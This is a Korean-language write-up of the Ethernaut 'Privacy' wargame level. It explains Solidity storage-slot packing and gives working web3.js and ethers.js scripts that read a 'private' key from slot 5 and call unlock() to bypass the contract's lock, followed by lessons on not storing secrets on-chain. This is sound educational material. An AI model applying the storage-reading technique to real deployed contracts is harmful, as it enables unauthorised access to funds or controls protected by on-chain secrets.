# Ethernaut **Privacy** 레벨 Write‑up

> 난이도: ⭐⭐⭐⭐☆ · 목표: `locked` 상태를 `false`로 바꿔 컨트랙트를 **unlock**

---

## 🧩 문제 개요

이 레벨의 핵심은 다음 한 줄입니다.

```solidity
require(_key == bytes16(data[2]));
```

`data`는 `bytes32[3] private` 이지만, **private ≠ 비밀**. 블록체인 스토리지는 누구나 읽을 수 있으므로 `data[2]`를 스토리지에서 직접 읽어 앞 16바이트(`bytes16`)만 꺼내 전달하면 `unlock`에 성공합니다.

---

## 🔍 대상 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

---

## 🧠 스토리지 레이아웃

Solidity는 상태변수를 **32바이트 슬롯**에 순차 저장하며, 작은 타입은 패킹됩니다.

| 슬롯 | 변수                                          | 크기/설명                      |
|:----:|----------------------------------------------|--------------------------------|
| 0    | `locked`                                     | `bool` (1바이트)               |
| 1    | `ID`                                         | `uint256` (32바이트, 단독 슬롯)|
| 2    | `flattening` + `denomination` + `awkwardness`| `1 + 1 + 2` 바이트로 패킹      |
| 3    | `data[0]`                                    | `bytes32`                      |
| 4    | `data[1]`                                    | `bytes32`                      |
| 5    | `data[2]` 👉 **목표 슬롯**                   | `bytes32`                      |

> 따라서 `getStorageAt(instance, 5)` 로 `data[2]` 값을 얻을 수 있습니다.

---

## 🚀 익스플로잇 절차

### 1) 스토리지에서 키 읽기 (web3.js)

```javascript
// 인스턴스 주소
const instance = "0xYourInstanceAddress";

// slot 5 = data[2] (32바이트)
const slot5 = await web3.eth.getStorageAt(instance, 5);

// unlock에는 bytes16이 필요 → 앞 16바이트(= 32 hex chars)만 사용
const key16 = slot5.slice(0, 34); // '0x' + 32 hex = 16 bytes
console.log("key16 =", key16);     // 예) 0x7c4132...941f
```

### 2) `unlock(bytes16)` 호출 (web3.js)

```javascript
const dataCalldata = web3.eth.abi.encodeFunctionCall({
  name: "unlock",
  type: "function",
  inputs: [{ name: "_key", type: "bytes16" }],
}, [key16]);

await web3.eth.sendTransaction({
  from: player,       // 플레이어 주소
  to:   instance,     // 컨트랙트 주소
  data: dataCalldata, // 인코딩된 호출 데이터
});
```

### 3) 결과 확인

```javascript
// 슬롯0 전체를 직접 보거나
const slot0 = await web3.eth.getStorageAt(instance, 0);
console.log("slot0 =", slot0);

// 혹은 public 변수로 확인
const abi = ["function locked() view returns (bool)"];
const c = new ethers.Contract(instance, abi, provider);
console.log("locked =", await c.locked()); // false면 성공
```

---

## 🧾 ethers.js 버전 (대안)

```javascript
await import("https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js");
const provider = new ethers.providers.Web3Provider(window.ethereum);
await provider.send("eth_requestAccounts", []);
const signer = provider.getSigner();

const instance = "0xYourInstanceAddress";

// slot5 읽기
const slot5 = await provider.getStorageAt(instance, 5);

// bytes16로 잘라 쓰기
const key16 = slot5.slice(0, 34);

// 호출
const abi = ["function unlock(bytes16 _key)"];
const privacy = new ethers.Contract(instance, abi, signer);
await (await privacy.unlock(key16)).wait();

// 확인
const viewAbi = ["function locked() view returns (bool)"];
const viewC = new ethers.Contract(instance, viewAbi, provider);
console.log("locked =", await viewC.locked());
```

---

## ⚡ 핵심 포인트 정리

- **private ≠ secret**: `private`는 *다른 컨트랙트에서의 직접 접근*만 막습니다. 체인 외부에서 스토리지는 누구나 읽을 수 있습니다.
- **bytes 캐스팅**: `bytes16(data[2])`는 **상위 16바이트**만 비교하므로, 32바이트 슬롯에서 **앞 16바이트**만 추출하면 됩니다.
- **패킹 주의**: 작은 정수 타입들은 같은 슬롯에 패킹됩니다. 배열/매핑은 규칙적으로 슬롯이 배정됩니다.

---

## 🛡️ 보안 교훈

1. **민감정보를 온체인에 평문 저장 금지**
   ```solidity
   // ❌ 위험
   bytes32 private apiKey;
   string  private password;
   ```

2. **커밋-리빌(Commit‑Reveal)과 같은 설계 사용**
   ```solidity
   // ✅ 안전 쪽으로
   bytes32 public commitHash; // commit(비밀) → 나중에 reveal(검증)
   ```

3. **오프체인 보관/암호화 고려**
   - 키/비밀은 오프체인, 혹은 암호화/암호증명(ZK) 구조 활용

---

## 📎 부록: 왜 슬롯 5인가?

- `locked`(slot0) → `ID`(slot1) → `flattening/denomination/awkwardness`(slot2, 패킹) → `data` 시작은 **slot3**  
- 고정 길이 `bytes32[3]` 배열은 연속 슬롯 사용: slot3, slot4, **slot5**  
- 따라서 `data[2]`는 **slot5** 에 저장됩니다.

---

## ✅ 체크리스트

- [ ] `getStorageAt(instance, 5)` 로 32바이트 값 확보
- [ ] 앞 16바이트(`0x` + 32 hex)만 추출해 `bytes16` 키 준비
- [ ] `unlock(key16)` 호출
- [ ] `locked == false` 확인 후 Submit

---

### 작성자 메모
- 테스트 중 변수 이름 충돌/스코프 오류를 피하려면 브라우저 콘솔 새로고침 후 실행하거나, 즉시실행 함수(IIFE)로 감싸 실행하면 편리합니다.
